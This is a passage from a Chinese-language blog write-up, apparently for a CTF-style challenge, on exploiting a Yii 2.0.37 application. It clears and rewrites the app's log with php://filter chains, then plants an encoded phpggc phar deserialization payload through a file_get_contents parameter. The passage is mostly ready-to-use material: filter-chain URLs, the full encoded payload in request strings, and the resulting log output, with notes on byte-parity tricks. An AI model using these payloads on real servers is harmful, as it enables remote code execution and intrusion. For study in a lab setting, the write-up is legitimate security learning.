class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log</span><br></pre></td></tr></table></figure><p>可以试一下，经过<code>convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8</code>会出现所谓的乱码，再base64-decode可以清除日志中的其他内容，接下来处理payload</p><p>对payload的处理就是上面的逆处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode&#x2F;resource&#x3D;payload.txt</span><br></pre></td></tr></table></figure><p><strong>注意这里还有些细节要处理，并不是直接将payload插进去就完事,注意以下几点</strong></p><blockquote><p>流处理过程中<strong>不能报错</strong>，因为报错信息会写进日志，对我们构造的phar文件造成影响</p><p>1.<code>convert.quoted-printable-decode</code>，=是这个处理的特殊符号，在除了payload触发点的其他地方出现，都可能引起报错，如果日志本身出现了=，那么估计只能另作考虑，不用这个了，但幸好，日志记录的内容除了我们的payload以外，并没有=</p><p>2.可能你已经注意到了，上面的日志示例，有两处可以出现payload，第二处15个字符截断，如果截断在=后面或者=后面只留一个数字，那么也是会报错的，所以这里的处理是，在payload前面添加长度&gt;=15的字符串，这样日志里面就只有一处payload了</p><p>3.<code>convert.iconv.utf-16be.utf-8</code>，它会将log中的内容进行编码转换，utf-16以两个字节为一个字符，所以我们log里面的字节数必须为<strong>偶数</strong>，不然也会报错，除此之外，<strong>我们的payload的第一个字节在转换编码为utf-8的时候必须和payload的第二个字节“凑一对”，而不是和payload前面的那一个字符“凑一对”</strong>，想一想就知道，第一个字节让抢了，我们的payload完整性不就没了，不就无法复原了，所以我们还要保证payload前面的字节数为偶数</p><p>前面的还好，就第三点比较麻烦，我们可以这样操作</p><p>先发送一个请求，在log中留下一个记录，file&gt;=15，将第二个payload点去除，方便我们控字节数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>再发一个携带payload的请求，在log中留下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00%3D0A%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00%3D0A%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00%3D0A%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00%3D0A%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00%3D0A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00%3D0A%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00%3D0A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00%3D0A%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00F%3D00D%3D00o%3D00y%3D00y%3D00f%3D00f%3D00m%3D003%3D00M%3D004%3D00B%3D00r%3D001%3D00c%3D00K%3D00C%3D00e%3D001%3D008%3D007%3D00Q%3D00C%3D00M%3D00Y%3D008%3D00e%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D%3D00%3D0A</span><br></pre></td></tr></table></figure><p>payload前面可以插入&gt;=15的任意数量的字符</p><p>现在可以分析，如何控字节数，我们发了两个请求，所以除去我们的payload部分，已经是偶数了，<strong>只要保证第一次请求的payload和第二次请求的payload加起来的字符数为偶数即可</strong>，就可以满足log中字节数为偶数的条件</p><p>我们可以控制的是第一个payload的长度，和 第二个payload前面字符的长度，而第二个payload有效部分已经是偶数了，所以简化成第一个payload加上第二个payload前面额外添加的字符数为偶数</p><p>还有一个条件，我们有效payload前面的字节数需要为偶数，在满足前面所有条件的情况下，我们可以在第二个payload<strong>首尾各添加n个字符实现</strong>，这样既不会影响全体奇偶性，也可以改变有效payload前面字符数的奇偶</p></blockquote><h3 id="0x04-构造payload解题"><a href="#0x04-构造payload解题" class="headerlink" title="0x04 构造payload解题"></a>0x04 构造payload解题</h3><p>下面是本地测试，实际做题可能由于环境不同需要做出改变</p><p><strong>首先清空日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log</span><br></pre></td></tr></table></figure><p><strong>发出第一个出错请求</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>通过phpggc生成phar，再经过上面的处理可以获取有效payload</p><p><strong>发出第二个出错请求，插入payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00D%3D00G%3D00x%3D00J%3D00s%3D00N%3D008%3D00T%3D00m%3D00i%3D00e%3D00m%3D00D%3D009%3D00t%3D00b%3D00O%3D00M%3D00J%3D00u%3D006%3D001%3D00%2F%3D00m%3D004%3D00%2B%3D00U%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D</span><br></pre></td></tr></table></figure><p>现在的日志为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">2021-08-06 15:43:45 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(xxxxxxxxxxxxxxx): failed to open stream: No such file or directory in E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php:65</span><br><span class="line">Stack trace:</span><br><span class="line">#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\phpstudy\\PHP...&#39;, 65, Array)</span><br><span class="line">#1 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx&#39;)</span><br><span class="line">#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()</span><br><span class="line">#3 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\InlineAction.php(57): call_user_func_array(Array, Array)</span><br><span class="line">#4 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)</span><br><span class="line">#5 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Module.php(534): yii\base\Controller-&gt;runAction(&#39;index&#39;, Array)</span><br><span class="line">#6 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\web\Application.php(104): yii\base\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)</span><br><span class="line">#7 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))</span><br><span class="line">#8 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\web\index.php(12): yii\base\Application-&gt;run()</span><br><span class="line">#9 &#123;main&#125;</span><br><span class="line">2021-08-06 15:44:02 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(xxxxxxxxxxxxxxx&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00 &#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00v&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00Y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00d&#x3D;002&#x3D;00h&#x3D;00v&#x3D;00Y&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;